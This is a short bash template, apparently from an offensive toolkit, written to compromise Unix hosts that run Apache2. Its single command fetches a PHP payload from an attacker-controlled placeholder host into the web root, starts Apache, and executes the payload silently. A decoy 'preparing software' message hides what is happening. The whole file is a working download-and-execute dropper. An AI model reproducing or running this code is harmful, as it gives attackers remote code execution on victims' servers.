# bash template | Author: r00t-3xp10it
# Target: Unix's with Apache2 Installed
# ---
# download payload.php from attackers side
# to target apache2 webroot, start apache2
# on target and execute payload.php
# ---
echo [*] Please wait, preparing software ...
# expressions to be 'sedded': InJ3C(payload.php) | Lh0St(192.168.1.68)
cd /var/www/html && wget -q -O /var/www/html/InJ3C http://Lh0St/InJ3C && /etc/init.d/apache2 start && php -f /var/www/html/InJ3C > /dev/null 2>&1
